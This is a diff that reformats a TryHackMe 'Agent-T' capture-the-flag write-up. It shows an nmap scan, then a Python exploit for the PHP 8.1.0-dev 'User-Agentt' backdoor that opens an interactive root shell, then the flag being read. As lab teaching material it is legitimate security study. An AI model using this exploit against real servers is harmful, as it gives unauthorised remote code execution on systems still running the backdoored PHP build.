@@ -1,80 +1,38 @@
 Agent-T TryHackMe Writeup
 
-Confirming that we have access to the machine 
+Confirming that we have access to the machine:
 
 ```bash
-
 ping 10.201.21.41
 
-```
-First we start with running the nmap command to determine the running services, ports, and fingerprinting the running operating system
+First, run an Nmap scan to determine services, ports, and OS fingerprinting:
 
-```bash
 sudo nmap -T4 -sS -O -Pn -SV 10.201.21.41
-[sudo] password for malware:
-Starting Nmap 7.98 (https://nmap.org) at 2025-11-03 14:00 -0700
-Warning: 10.201.21.41 giving up on port because retransmission cap hit (6). Nmap scan report for 10.201.21.41
-Host is up (0.089s latency).
-Not shown: 993 closed tcp ports (reset)
-PORT         STATE    SERVICE        VERSION
-80/tcp open  http     PHP            cli server 5.5 or later (PHP 8.1.0-dev)
-1216/tcp     filtered etebac5
-2065/tcp     filtered dlsrpn
-2909/tcp     filtered funk-dialout
-3301/tcp     filtered tarantool
-32771/tcp    filtered sometimes-rpc5 
-65389/tcp    filtered unknown
-Device type: general purpose
-Running: Linux 4.X|5.X
-OS CPE: cpe:/o:linux: linux_kernel: 4 cpe:/o: linux:linux_kernel:5
-OS details: Linux 4.15 - 5.19
-Network Distance: 5 hops
 
-OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . 
-Nmap done: 1 IP address (1 host up) scanned in 137.14 seconds
+Results:
 
-```
-Port 80 is open, navigate to the web address.
+    Port 80/tcp (HTTP) is open running PHP 8.1.0-dev
 
-```bash 
+    Several filtered ports
+
+    OS likely Linux kernel 4.x–5.x
+
+Navigate to the web service:
 
 http://10.201.21.41
 
-```
+The webpage doesn’t reveal much, but PHP 8.1.0-dev is known to be vulnerable due to a built‑in backdoor.
 
-Taking us there doesn't give us a whole lot, but the service that is running on port 80 is vulnerable.
+Search ExploitDB for:
 
-Navigate to exploitDB and search for "PHP 8.1.0"
+PHP 8.1.0
 
-CVE Link: https://www.exploit-db.com/exploits/49933
+Exploit link:
+https://www.exploit-db.com/exploits/49933
 
-Notice that is a 'Remote Code Execution' we leverage this to get into the machine.
+This vulnerability allows Remote Code Execution via a malicious User-Agentt header.
 
-Grab the code in the listed exploit 
-
-```bash
-
-# Exploit Title: PHP 8.1.0-dev - 'User-Agentt' Remote Code Execution
-# Date: 23 may 2021
-# Exploit Author: flast101
-# Vendor Homepage: https://www.php.net/
-# Software Link: 
-#     - https://hub.docker.com/r/phpdaily/php
-#    - https://github.com/phpdaily/php
-# Version: 8.1.0-dev
-# Tested on: Ubuntu 20.04
-# References:
-#    - https://github.com/php/php-src/commit/2b0f239b211c7544ebc7a4cd2c977a5b7a11ed8a
-#   - https://github.com/vulhub/vulhub/blob/master/php/8.1-backdoor/README.zh-cn.md
-
-"""
-Blog: https://flast101.github.io/php-8.1.0-dev-backdoor-rce/
-Download: https://github.com/flast101/php-8.1.0-dev-backdoor-rce/blob/main/backdoor_php_8.1.0-dev.py
-Contact: flast101.sec@gmail.com
-
-An early release of PHP, the PHP 8.1.0-dev version was released with a backdoor on March 28th 2021, but the backdoor was quickly discovered and removed. If this version of PHP runs on a server, an attacker can execute arbitrary code by sending the User-Agentt header.
-The following exploit uses the backdoor to provide a pseudo shell ont the host.
-"""
+Use the exploit script:
 
 #!/usr/bin/env python3
 import os
@@ -88,49 +46,42 @@ response = request.get(host)
 if str(response) == '<Response [200]>':
     print("\nInteractive shell is opened on", host, "\nCan't acces tty; job crontol turned off.")
     try:
-        while 1:
+        while True:
             cmd = input("$ ")
             headers = {
-            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0",
-            "User-Agentt": "zerodiumsystem('" + cmd + "');"
+                "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:78.0)",
+                "User-Agentt": "zerodiumsystem('" + cmd + "');"
             }
-            response = request.get(host, headers = headers, allow_redirects = False)
+            response = request.get(host, headers=headers, allow_redirects=False)
             current_page = response.text
-            stdout = current_page.split('<!DOCTYPE html>',1)
-            text = print(stdout[0])
+            stdout = current_page.split('<!DOCTYPE html>', 1)
+            print(stdout[0])
     except KeyboardInterrupt:
         print("Exiting...")
         exit
-
 else:
-    print("\r")
     print(response)
     print("Host is not available, aborting...")
     exit
-          
-```
 
-Running the script asks for the host url, enter it and we should have a shell 
-
-```bash 
+Run it:
 
 python php8.1.0exploit.py
-
 Enter the full host url:
 http://10.201.21.41
 
+Success:
+
 Interactive shell is opened on http://10.201.21.41
-Can't access tty; job crontol turned off.
-$ whoami 
+$ whoami
 root
 
-```
+List the root directory:
 
-Navigating to the root directory and running the command:
+ls /
 
-```bash
+You should see:
 
-$ ls /
 bin
 boot
 dev
@@ -152,7 +103,8 @@ tmp
 usr
 var
 
-```
-To complete the room we just need to simply ```bash cat flag.txt ```
+Get the flag:
 
-Congratulations, hope this quick write up helps. 
+cat flag.txt
+
+Congratulations — you’ve rooted the machine and completed the room.
